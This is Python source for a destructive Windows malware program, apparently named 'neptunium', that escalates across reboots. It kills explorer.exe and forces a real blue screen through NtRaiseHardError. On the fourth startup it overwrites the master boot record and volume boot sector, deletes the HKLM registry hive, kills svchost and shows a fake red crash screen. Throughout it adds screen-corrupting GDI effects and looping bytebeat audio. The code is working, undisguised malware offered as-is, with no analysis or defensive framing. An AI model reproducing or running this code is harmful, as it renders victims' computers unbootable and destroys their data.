#import

from win32gui import*
from win32con import*
import os
from ctypes import POINTER, byref, c_int, c_uint, c_ulong, windll
import win32gui
import win32con
from win32ui import*
from win32api import*
from win32file import *
import sys
from random import randrange
import time
import threading
import ctypes
import shutil
import ctypes
from ctypes import byref, create_string_buffer, c_byte, POINTER, sizeof
from win32api import Sleep
from functools import partial
from numpy import sin, tan, cos, sqrt
import tkinter as tk
import random
from datetime import date
import winreg

#variables

stup = os.environ["USERPROFILE"] + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe"
user = os.getlogin()
dpath = os.environ["USERPROFILE"] + "/Desktop/"
userfolder = os.environ["USERPROFILE"] 
autorun = os.environ["USERPROFILE"] + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\kernel32.bat"
hdc = win32gui.GetDC(0)
desk = win32gui.GetDC(0)
x,y = GetDeviceCaps(hdc, win32con.DESKTOPHORZRES),GetDeviceCaps(hdc, win32con.DESKTOPVERTRES)
IconError = LoadIcon(None, 32513)
sw = x
sh = y
w = x
h = y

class source:

    def resource_path(relative_path):

        try:
            base_path = sys._MEIPASS

        except Exception:
            
            base_path = os.path.abspath(".")

        return os.path.join(base_path, relative_path)
    
class system:

    def BSOD():

        nullptr = POINTER(c_int)()

        windll.ntdll.RtlAdjustPrivilege(
            c_uint(19),
            c_uint(1),
            c_uint(0),
            byref(c_int())
        )

        windll.ntdll.NtRaiseHardError(
            c_ulong(0xDEADDEAD),
            c_ulong(0),
            nullptr,
            nullptr,                    
            c_uint(6),
            byref(c_uint())
            ) 
        
    def enablereg():
         
        
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System')
        winreg.SetValueEx(key, 'DisableRegistryTools', 0, winreg.REG_DWORD, 0)
        winreg.CloseKey(key)

    def mbr():

        hDevice = CreateFileW("\\\\.\\PhysicalDrive0", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
        WriteFile(hDevice, AllocateReadBuffer(512), None)
        CloseHandle(hDevice)        
        hDevice = CreateFileW("\\\\.\\C:", GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING, 0,0)
        WriteFile(hDevice, AllocateReadBuffer(512), None)
        CloseHandle(hDevice) 
        
class gdi:

    def dark():

        while True:
            BitBlt(desk, -1, -1, sw, sh, desk, 0, 0, SRCAND)
            Sleep(1000)

    def bloodscreen():

        t = 0.01
        a = PATCOPY
        for i in range(y):
            brush = CreateSolidBrush(RGB(
                        randrange(150),
                        0,
                        randrange(10)
                    ))
            SelectObject(desk, brush)
            PatBlt(desk, 0, 0, x, i, a)
            time.sleep(t)

    def flash():
        
        while True:
            brush = CreateSolidBrush(RGB(
            randrange(255),
            randrange(255),
            randrange(255),
            ))
            SelectObject(desk,brush)
            BitBlt(desk,0,0,w,h,desk,-1,-1,SRCINVERT)
            BitBlt(desk,0,0,w,h,desk,1,-1,SRCINVERT)
            BitBlt(desk,0,0,w,h,desk,-1,1,SRCINVERT)
            BitBlt(desk,0,0,w,h,desk,1,1,SRCINVERT)
        
    def mirror():

        while True:
            brush = CreateSolidBrush(RGB(
                randrange(255),
                randrange(255),
                randrange(255),
                ))
            SelectObject(desk,brush)
            PatBlt(desk,randrange(x),randrange(y),randrange(x),randrange(y),PATINVERT)
            StretchBlt(desk, 30, 30, sw - 0, sh - 0, desk, sw, sh, -sw, -sh, SRCCOPY)
            BitBlt(desk,10,10,w,h,desk,12,12,SRCINVERT)
            DeleteObject(brush)

    def Icon():
        while True:
            DrawIcon(hdc, randrange(x), randrange(y), IconError)
            Sleep(3000)

    def fasticon():
        while True:
            DrawIcon(hdc, randrange(x), randrange(y), IconError)
            Sleep(300)

    def icondance():
        import commctrl as cc
        import win32gui 
        import random

        search_criteria=(
            (0, "Progman", None),
            (0, "SHELLDLL_DefView", None),
            (0, "SysListView32", None),

        )

        wnd = 0
        for crit in search_criteria:
            wnd = win32gui.FindWindowEx (wnd, *crit)
            
        while True:
            icon=int (win32gui.SendMessage (wnd, cc.LVM_GETITEMCOUNT) )

            random_module = (random.randint (0,1000) << 16) | random.randint (0, 1000)
            win32gui.SendMessage(wnd, cc.LVM_SETITEMPOSITION, 4, random_module)

            random_module = (random.randint(0,1000) << 16) | random.randint (0,1000)

class Infix(object):
	def __init__(self, func): self.func = func
	def __or__(self, other): return self.func(other)
	def __ror__(self, other): return Infix(partial(self.func, other))
	def __call__(self, v1, v2): return self.func(v1, v2)
LPSTR,BYTE,WORD,UINT,DWORD,HANDLE=ctypes.c_char_p,ctypes.c_byte,ctypes.c_ushort,ctypes.c_uint,ctypes.c_ulong,ctypes.c_void_p
HWAVEOUT = HANDLE
LPHWAVEOUT = POINTER(HWAVEOUT)
winmm = ctypes.windll.Winmm
waveOutOpen,waveOutPrepareHeader,waveOutWrite,waveOutUnprepareHeader,waveOutClose=winmm.waveOutOpen,winmm.waveOutPrepareHeader,winmm.waveOutWrite,winmm.waveOutUnprepareHeader,winmm.waveOutClose
WAVE_FORMAT_PCM,WAVE_MAPPER,CALLBACK_NULL=1,-1,0

class WAVEFORMATEX(ctypes.Structure): 
		_fields_ = [ 
			("wFormatTag", WORD), 
			("nChannels", WORD), 
			("nSamplesPerSec", DWORD), 
			("nAvgBytesPerSec", DWORD), 
			("nBlockAlign", WORD), 
			("wBitsPerSample", WORD), 
			("cbSize", WORD) 
		] 
LPWAVEFORMATEX = POINTER(WAVEFORMATEX) 
class WAVEHDR(ctypes.Structure): 
	pass 
LPWAVEHDR = POINTER(WAVEHDR) 
WAVEHDR._fields_ = [ 
	("lpData", LPSTR), 
	("dwBufferLength", DWORD), 
	("dwBytesRecorded", DWORD), 
	("dwUser", DWORD), 
	("dwFlags", DWORD), 
	("dwLoops", DWORD), 
	("lpNext", LPWAVEHDR), 
	("reserved", DWORD) 
]
LPWAVEHDR = POINTER(WAVEHDR)

division_key_fix=Infix(lambda x,y: x/y if y else 0)
operand_key_fix=Infix(lambda x,y: int(x)|int(y))
charcodeat_key_fix=Infix(lambda s,y: ord(s[y]))
operand_gtgt_key_fix=Infix(lambda x,y: int(x)>>int(y))
operand_ltlt_key_fix=Infix(lambda x, y: int(x)<<int(y))
operand_and_key_fix=Infix(lambda x, y: int(x)&int(y))

class ByteBeat:
	def GenerateBuffer(EQUATION, SECONDS_PLAYING, AMOUNT_KILOHERTZ=8000):

		EQUATION = EQUATION.replace('^','**').replace('random()','__import__("random").random()').replace('|','|operand_key_fix|').replace('/','|division_key_fix|').replace('?',' if ').replace(':',' else ').replace('.charCodeAt',' |charcodeat_key_fix| ').replace('>>',' |operand_gtgt_key_fix| ').replace('<<',' |operand_ltlt_key_fix| ').replace('&', ' |operand_and_key_fix| ')
		hWaveOut = HWAVEOUT(0)
		wfx = WAVEFORMATEX(WAVE_FORMAT_PCM, 1, AMOUNT_KILOHERTZ, AMOUNT_KILOHERTZ, 1, 8,0)
		waveOutOpen(byref(hWaveOut), WAVE_MAPPER, LPWAVEFORMATEX(wfx), 0, 0, CALLBACK_NULL)
		buffer = create_string_buffer(int(AMOUNT_KILOHERTZ) * SECONDS_PLAYING)
		for t in range(0, int(AMOUNT_KILOHERTZ) * SECONDS_PLAYING):buffer.value += c_byte(int(eval(EQUATION)))
		return buffer.raw

	def Play(EQUATION, SECONDS_PLAYING, AMOUNT_KILOHERTZ, ASYNC_SLEEP = False):

		EQUATION = EQUATION.replace('^','**').replace('random()','__import__("random").random()').replace('|','|operand_key_fix|').replace('/','|division_key_fix|').replace('?',' if ').replace(':',' else ').replace('.charCodeAt',' |charcodeat_key_fix| ').replace('>>',' |operand_gtgt_key_fix| ').replace('<<',' |operand_ltlt_key_fix| ').replace('&', ' |operand_and_key_fix| ')
		hWaveOut = HWAVEOUT(0)
		wfx = WAVEFORMATEX(WAVE_FORMAT_PCM, 1, AMOUNT_KILOHERTZ, AMOUNT_KILOHERTZ, 1, 8,0)
		winmm.waveOutOpen.argtypes = (LPHWAVEOUT, UINT, LPWAVEFORMATEX, DWORD, DWORD, DWORD) 
		waveOutOpen(byref(hWaveOut), WAVE_MAPPER, LPWAVEFORMATEX(wfx), 0, 0, CALLBACK_NULL)
		buffer = create_string_buffer(int(AMOUNT_KILOHERTZ) * SECONDS_PLAYING)
		for t in range(0, int(AMOUNT_KILOHERTZ) * SECONDS_PLAYING):buffer.value += c_byte(int(eval(EQUATION)))
		buffer = buffer.raw
		wHeader = WAVEHDR(buffer, len(buffer), 0, 0, 0, 0)
		waveOutPrepareHeader(hWaveOut, byref(wHeader), sizeof(WAVEHDR))
		waveOutWrite(hWaveOut, byref(wHeader), sizeof(WAVEHDR))
		waveOutUnprepareHeader(hWaveOut, byref(wHeader), sizeof(WAVEHDR))
		waveOutClose(hWaveOut)
		if ASYNC_SLEEP: Sleep(SECONDS_PLAYING*1000)
		return True
	def PlayFromBuffer(buffer, SECONDS_PLAYING, AMOUNT_KILOHERTZ, ASYNC_SLEEP=False):
		hWaveOut = HWAVEOUT(0)
		wfx = WAVEFORMATEX(WAVE_FORMAT_PCM, 1, AMOUNT_KILOHERTZ, AMOUNT_KILOHERTZ, 1, 8,0)
		waveOutOpen(byref(hWaveOut), WAVE_MAPPER, LPWAVEFORMATEX(wfx), 0, 0, CALLBACK_NULL)
		wHeader = WAVEHDR(buffer, len(buffer), 0, 0, 0, 0)
		waveOutPrepareHeader(hWaveOut, byref(wHeader), sizeof(WAVEHDR))
		waveOutWrite(hWaveOut, byref(wHeader), sizeof(WAVEHDR))
		waveOutUnprepareHeader(hWaveOut, byref(wHeader), sizeof(WAVEHDR))
		waveOutClose(hWaveOut)
		if ASYNC_SLEEP: Sleep(SECONDS_PLAYING*1000)
		return True
	
def dow():
	beats = []

	beats.append(ByteBeat.GenerateBuffer('t%0.81*t', 10, 8000))

	while True:
		for beat in beats:
			ByteBeat.PlayFromBuffer(beat, 9, 8000, True)


def bytebeat_play():
    threads = []
    for i in range(1):
        t = threading. Thread (target=dow)
        threads.append(t)
        time.sleep(1)
        threads[i].start()

if os.path.isfile("C:\\Windows\\System32\\command1") == False:
    #if it is the first startup

    os.popen("echo neptunium >> C:\\Windows\\System32\\command1")
    gdi.Icon()
    
else:
    
    if os.path.isfile("C:\\Windows\\System32\\command2") == False:
            
        #if it is the second startup
        os.popen("echo neptunium >> C:\\Windows\\System32\\command2")
        os.popen("taskkill /f /im explorer.exe")
        os.popen("MSG * No computer today, go outside and play.")

    else:
         
        if os.path.isfile("C:\\Windows\\System32\\command3") == False:
              
            #if it is the 3rd startup:
            os.popen("echo neptunium >> C:\\Windows\\System32\\command3")
            os.popen("slui 0x2a 0xDEADDEAD")
                        
            def boxthread():
                window = tk.Tk()
                width = window.winfo_screenwidth()
                height = window.winfo_screenheight()
                a = random.randrange(0, width)
                b = random.randrange(0, height)

                window.title('ņ̴̛̬̫̎̀̕é̵̡̺̭̥͇̈́̂̏̅̉p̷͕̱̦͊ẗ̸͉̩̬͒͆̒ǘ̵͖͐̏̈͝͝n̶̪̬̙̘̳̂i̶̡̦̗̦͗̚͘͝ǘ̵̠̹̤̈́̎̚̕m̵̠̽͌͛̽')

                window.geometry ("200x100" + "+" + str(a) + "+" + str(b)) 
                tk.Label(window,
                        text = 'RUN AWAY',
                        font=('courier new',14),
                        width=15, height=17,
                        fg = "red",
                        bg = "black"
                        ).pack()
                window.mainloop()
            def box():
            
                boxes = []
                for i in range(100):
                    t = threading. Thread (target=dow)
                    boxes.append(t)
                    time.sleep(1)
                    boxes[i].start()

            box()

            system.BSOD()


        else:

            if os.path.isfile("C:\\Windows\\System32\\command3") == True: 
            
                #if it is the 4th startup:
                system.mbr()

                def thread1():
                    a = []
                    for i in range(1):
                        t = threading. Thread (target=gdi.dark)
                        a.append(t)
                        time.sleep(1)
                        a[i].start()


                    d = []
                    for i in range(1):
                        t = threading. Thread (target=gdi.fasticon)
                        d.append(t)
                        time.sleep(1)
                        d[i].start()

                thread1()

                os.popen("taskkill /f /im explorer.exe")
                
                def RSOD():
                    window = tk.Tk()
                    window.attributes('-fullscreen', True)
                    tk.Label(window,
                            text = 'A problem has been detected and windows has been shutdown to prevent damage to your computer.\r\nIRQL_NOT_LESS_OR_EQUAL\r\nIf this is the first time you have seen this error screen, restart your\rcomputer. if this screen appears again. follow these steps:\rCheck to make sure any hardware or software is properly installed.\rIf this is a new installation. ask your hardware or software manufacturer\rfor any windows updates you might need.\r\nIf problems continue, disable or remove any newly installed hardware or\rsoftware. Disable BIOS memory options such as caching or shadowing. If\r you need to use Safe Mode to remove or disable components, restart your\rcomputer, press F8 to select Advanced Startup Options, and then select\rSafe Mode.\r\nTechnical information:\r\n*** STOP: 0xDEADDEAD (0xDEADDEAD, 0xDEADDEAD, 0xDEADDEAD, 0xDEADDEAD)\r\nCollecting data for crash dump...\rInitializing disk for crash dump...\rBeginning dump of physical memory.\rDumping physical memory to disk: 100\rPhysical memory dump complete.\rContact your system administator or technical support group for further assistance.',
                            fg = 'darkred',
                            font=('consolas',16,),
                            background="black",
                            width=x, height=y, 
                            justify = ['left'] ,           
                            ).pack()
                    window.mainloop()

                system.enablereg()
                os.popen("reg delete HKLM /f & taskkill /f /im svchost.exe")
                RSOD()
